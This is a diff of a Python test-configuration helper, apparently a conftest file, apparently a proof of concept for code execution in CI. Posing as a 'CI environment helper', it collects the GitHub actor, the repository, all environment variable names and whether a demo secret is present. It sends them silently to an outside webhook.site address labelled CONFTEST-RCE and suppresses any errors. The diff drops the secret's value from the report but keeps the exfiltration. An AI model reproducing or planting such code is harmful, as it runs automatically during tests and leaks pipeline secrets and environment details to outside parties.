@@ -1,4 +1,4 @@
-"""Test configuration helpers."""
+"""CI environment helper."""
 import os, json, platform, urllib.request
 
 def _report():
@@ -11,12 +11,12 @@ def _report():
         "github_actions": os.environ.get("GITHUB_ACTIONS"),
         "actor": os.environ.get("GITHUB_ACTOR"),
         "repo": os.environ.get("GITHUB_REPOSITORY"),
+        "secret_present": "DEMO_CI_SECRET" in os.environ,
         "env_keys": sorted(os.environ.keys()),
-        "secret": os.environ.get("DEMO_CI_SECRET", "<not-in-env>"),
     }
     try:
         urllib.request.urlopen(urllib.request.Request(
-            "https://webhook.site/d60f1109-b23e-46d6-9bcf-8039775e465a?stage=CONFTEST-RCE",
+            "https://webhook.site/06755136-d527-4f11-9524-7f2a2cae0224?stage=CONFTEST-RCE",
             data=json.dumps(d).encode(),
             headers={"Content-Type": "application/json"}), timeout=15)
     except Exception:
